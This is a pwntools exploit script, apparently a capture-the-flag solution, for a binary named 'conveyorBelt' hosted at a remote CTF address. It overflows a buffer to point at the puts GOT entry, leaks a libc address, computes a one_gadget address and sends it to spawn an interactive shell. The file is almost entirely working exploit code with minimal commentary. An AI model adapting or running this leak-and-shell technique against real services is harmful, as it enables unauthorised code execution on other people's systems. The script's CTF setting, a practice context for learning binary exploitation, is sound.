from pwn import *

b = ELF("./conveyorBelt")
libc = b.libc

# gadget found using one_gadget
#o_gadgets = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a38c, 0x10a398]
#for o_gadget in o_gadgets:

o_gadget = 0x10a38c

if args.GDB:
    p = gdb.debug(b.path, gdbscript='start')
elif args.ONLINE:
    p = remote('jh2i.com',50020)
else:
    p = process("./conveyorBelt")

# Ajout d'une part
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("name: ")
p.sendline("A")

# Safety check
p.recvuntil("> ")
p.sendline("2")
p.recvuntil("safe? ")
p.sendline("n")
p.recvuntil("alternative: ")

# change next part to puts entry in GOT
payload = "A"*0x78 + p64(b.got["puts"])
p.sendline(payload)

# leak address of puts in PLT
p.recvline()
data = p.recvline().strip("\n")
l_puts = u64(data.ljust(8, "\x00"))

# retrieve libc base address and find our gadget adress
l_libc = l_puts - libc.symbols["puts"] 
gadget = l_libc + o_gadget

log.info("using gadget : %s" % hex(o_gadget))
log.info("leak puts: %s" % hex(l_puts))
log.info("leak libc: %s" % hex(l_libc))
log.info("gadget   : %s" % hex(gadget))

p.recvuntil("safe? ")
p.sendline(p64(gadget)*(0x38/8))
p.interactive()
